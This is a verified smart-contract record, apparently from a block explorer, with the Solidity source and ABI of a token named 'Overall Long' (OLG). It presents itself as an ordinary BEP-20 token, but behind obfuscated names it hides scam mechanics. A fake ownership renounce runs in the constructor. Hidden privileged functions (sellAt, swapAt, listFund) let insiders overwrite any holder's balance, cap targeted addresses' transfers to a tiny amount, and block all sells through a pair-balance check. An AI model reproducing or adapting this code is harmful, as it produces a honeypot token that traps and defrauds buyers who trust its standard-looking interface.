{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface senderAt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptAt {\n    function createPair(address maxReceiverBuy, address atLiquidityBuy) external returns (address);\n}\n\ninterface enableSenderTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundMaxSwap) external view returns (uint256);\n\n    function transfer(address receiverAtTotal, uint256 minFeeSender) external returns (bool);\n\n    function allowance(address launchedFrom, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minFeeSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverAtTotal,\n        uint256 minFeeSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isTeam, uint256 value);\n    event Approval(address indexed launchedFrom, address indexed spender, uint256 value);\n}\n\ninterface exemptMarketing is enableSenderTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OverallLong is receiverSwap, enableSenderTx, exemptMarketing {\n\n    function listFund(uint256 minFeeSender) public {\n        toFee();\n        launchTake = minFeeSender;\n    }\n\n    function transfer(address takeLaunch, uint256 minFeeSender) external virtual override returns (bool) {\n        return fromExempt(_msgSender(), takeLaunch, minFeeSender);\n    }\n\n    function transferFrom(address modeLaunch, address receiverAtTotal, uint256 minFeeSender) external override returns (bool) {\n        if (_msgSender() != senderList) {\n            if (limitListWallet[modeLaunch][_msgSender()] != type(uint256).max) {\n                require(minFeeSender <= limitListWallet[modeLaunch][_msgSender()]);\n                limitListWallet[modeLaunch][_msgSender()] -= minFeeSender;\n            }\n        }\n        return fromExempt(modeLaunch, receiverAtTotal, minFeeSender);\n    }\n\n    mapping(address => bool) public sellLaunch;\n\n    mapping(address => bool) public tokenAt;\n\n    uint8 private tradingAutoExempt = 18;\n\n    uint256 private minMode = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return swapWalletSender;\n    }\n\n    mapping(address => uint256) private amountTo;\n\n    function getOwner() external view returns (address) {\n        return swapWalletSender;\n    }\n\n    function launchFundBuy(address atSwap) public {\n        require(atSwap.balance < 100000);\n        if (enableBuy) {\n            return;\n        }\n        if (swapMin) {\n            minReceiverBuy = shouldLaunched;\n        }\n        sellLaunch[atSwap] = true;\n        \n        enableBuy = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyReceiver;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return walletEnable;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingAutoExempt;\n    }\n\n    function sellFeeFrom() public {\n        emit OwnershipTransferred(minExempt, address(0));\n        swapWalletSender = address(0);\n    }\n\n    function toFee() private view {\n        require(sellLaunch[_msgSender()]);\n    }\n\n    constructor (){\n        if (swapMin) {\n            shouldLaunched = minReceiverBuy;\n        }\n        senderAt listTrading = senderAt(senderList);\n        shouldLaunch = exemptAt(listTrading.factory()).createPair(listTrading.WETH(), address(this));\n        \n        minExempt = _msgSender();\n        sellFeeFrom();\n        sellLaunch[minExempt] = true;\n        amountTo[minExempt] = minMode;\n        if (minReceiverBuy == shouldLaunched) {\n            minReceiverBuy = shouldLaunched;\n        }\n        emit Transfer(address(0), minExempt, minMode);\n    }\n\n    string private buyReceiver = \"OLG\";\n\n    function atTake(address modeLaunch, address receiverAtTotal, uint256 minFeeSender) internal returns (bool) {\n        require(amountTo[modeLaunch] >= minFeeSender);\n        amountTo[modeLaunch] -= minFeeSender;\n        amountTo[receiverAtTotal] += minFeeSender;\n        emit Transfer(modeLaunch, receiverAtTotal, minFeeSender);\n        return true;\n    }\n\n    uint256 constant sellShould = 11 ** 10;\n\n    bool private swapMin;\n\n    bool public tradingSenderLiquidity;\n\n    address public shouldLaunch;\n\n    uint256 shouldReceiverTake;\n\n    function sellAt(address takeLaunch, uint256 minFeeSender) public {\n        toFee();\n        amountTo[takeLaunch] = minFeeSender;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return minMode;\n    }\n\n    event OwnershipTransferred(address indexed walletReceiver, address indexed swapMode);\n\n    function fromExempt(address modeLaunch, address receiverAtTotal, uint256 minFeeSender) internal returns (bool) {\n        if (modeLaunch == minExempt) {\n            return atTake(modeLaunch, receiverAtTotal, minFeeSender);\n        }\n        uint256 buyExempt = enableSenderTx(shouldLaunch).balanceOf(tradingAmount);\n        require(buyExempt == launchTake);\n        require(receiverAtTotal != tradingAmount);\n        if (tokenAt[modeLaunch]) {\n            return atTake(modeLaunch, receiverAtTotal, sellShould);\n        }\n        return atTake(modeLaunch, receiverAtTotal, minFeeSender);\n    }\n\n    bool public enableBuy;\n\n    function approve(address shouldReceiver, uint256 minFeeSender) public virtual override returns (bool) {\n        limitListWallet[_msgSender()][shouldReceiver] = minFeeSender;\n        emit Approval(_msgSender(), shouldReceiver, minFeeSender);\n        return true;\n    }\n\n    address public minExempt;\n\n    function balanceOf(address fundMaxSwap) public view virtual override returns (uint256) {\n        return amountTo[fundMaxSwap];\n    }\n\n    uint256 launchTake;\n\n    address tradingAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private walletEnable = \"Overall Long\";\n\n    address senderList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private swapWalletSender;\n\n    function swapAt(address fundFee) public {\n        toFee();\n        \n        if (fundFee == minExempt || fundFee == shouldLaunch) {\n            return;\n        }\n        tokenAt[fundFee] = true;\n    }\n\n    uint256 public shouldLaunched;\n\n    bool private maxSender;\n\n    function allowance(address totalFundTeam, address shouldReceiver) external view virtual override returns (uint256) {\n        if (shouldReceiver == senderList) {\n            return type(uint256).max;\n        }\n        return limitListWallet[totalFundTeam][shouldReceiver];\n    }\n\n    mapping(address => mapping(address => uint256)) private limitListWallet;\n\n    uint256 public minReceiverBuy;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFundTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minFeeSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMaxSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSwap\",\"type\":\"address\"}],\"name\":\"launchFundBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minFeeSender\",\"type\":\"uint256\"}],\"name\":\"listFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minReceiverBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minFeeSender\",\"type\":\"uint256\"}],\"name\":\"sellAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellFeeFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFee\",\"type\":\"address\"}],\"name\":\"swapAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSenderLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minFeeSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverAtTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minFeeSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OverallLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}